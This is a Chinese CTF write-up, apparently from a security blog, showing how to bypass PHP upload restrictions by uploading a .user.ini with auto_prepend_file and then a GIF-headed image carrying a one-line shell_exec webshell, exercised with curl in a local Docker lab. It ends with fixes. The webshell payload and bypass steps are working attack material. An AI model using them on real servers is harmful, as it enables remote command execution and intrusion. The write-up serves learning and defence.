---
title: "文件上传：.user.ini + 图片马"
slug: "ctf-upload-user-ini"
date: 2026-08-30T22:18:53+08:00
lastmod: 2026-10-27T11:30:00+08:00
draft: false
author: ["xuanwo"]
description: "用 .user.ini 配合图片马绕过上传限制，拿到 WebShell。"
summary: "用 .user.ini 配合图片马绕过上传限制，拿到 WebShell。"
tags: ["CTF", "文件上传", ".user.ini"]
categories: ["CTF Writeup"]
series: ["CTF Writeup"]
weight: 8
ShowToc: true
TocOpen: false
hidemeta: false
comments: false
showReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowCodeCopyButtons: true
source_repo: "https://github.com/xuanwoLQL/security-notes/blob/main/ctf-writeups/8.一个文件上传漏洞.md"
---

## 复现流程图

<figure class="note-diagram">
  <img src="/images/notes/ctf-upload-user-ini/workflow.svg" alt="先上传配置改变 PHP 自动包含行为，再让图片文件进入解释器。" loading="lazy">
  <figcaption>图 1 · .user.ini + 图片马。先上传配置改变 PHP 自动包含行为，再让图片文件进入解释器。</figcaption>
</figure>

## 1. 本地环境

准备 Apache + PHP：

```bash
mkdir -p /tmp/user-ini-lab/uploads
cd /tmp/user-ini-lab
docker run --rm -d --name user-ini-lab \
  -p 8080:80 \
  -v /tmp/user-ini-lab:/var/www/html \
  php:8.2-apache
```

创建 `index.php`：

```php
<?php
echo "target page\n";
```

## 2. 上传 `.user.ini`

```ini
auto_prepend_file=/var/www/html/uploads/avatar.jpg
```

上传：

```bash
curl -i -sS -F 'file=@.user.ini;filename=.user.ini' \
  'http://127.0.0.1:8080/upload.php'
```

如果题目在上传文件名前加随机前缀，需根据实际路径调整
`auto_prepend_file`。

## 3. 上传图片马

创建 `avatar.jpg`：

```php
GIF89a
<?php echo shell_exec($_GET['cmd']); ?>
```

上传：

```bash
curl -sS -F 'file=@avatar.jpg' \
  'http://127.0.0.1:8080/upload.php'
```

## 4. 触发

访问同目录下的任意 PHP：

```bash
curl -sS --get --data-urlencode 'cmd=id' \
  'http://127.0.0.1:8080/index.php'
```

因为 `auto_prepend_file` 会在执行 `index.php` 前包含 `avatar.jpg`，图片马的 PHP 代码会被执行。

## 5. 排错

| 现象 | 原因 |
| --- | --- |
| `.user.ini` 不生效 | PHP 运行模式不是 FPM/Apache module |
| 报文件不存在 | `auto_prepend_file` 路径不对 |
| 图片马不执行 | 文件不在同一目录或路径不可读 |
| Nginx 环境无效 | `.user.ini` 是 PHP 配置，不是 Nginx 配置 |

## 6. 修复

- 禁止上传 `.user.ini`、`.htaccess`；
- 上传目录不可执行；
- 文件随机改名；
- 解析配置与上传目录隔离；
- 使用对象存储保存用户文件。
